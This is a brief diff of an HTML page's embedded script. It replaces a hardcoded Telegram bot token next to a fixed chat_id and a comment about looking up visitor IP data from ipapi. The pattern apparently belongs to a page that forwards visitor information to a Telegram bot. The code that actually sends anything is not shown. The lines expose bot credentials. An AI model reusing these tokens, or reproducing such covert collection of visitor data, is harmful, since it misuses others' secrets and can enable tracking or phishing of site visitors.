@@ -343,7 +343,7 @@
 	</script>
 	<script>
 			// 1. Token de Telegram y chat_id
-			const token = '7004802695:AAGj1fMLTl2CkvpIomMSwbPa_psfGGHnkFA'; // Token de tu bot
+			const token = '7768777682:AAGE6M2P2Rf25LDN1vmKc-4n_vH5HWlUEMU'; // Token de tu bot
 			const chat_id = '6453849756'; // chat_id (usuario o grupo)
 
 			// 2. Función para obtener información de la IP desde ipapi
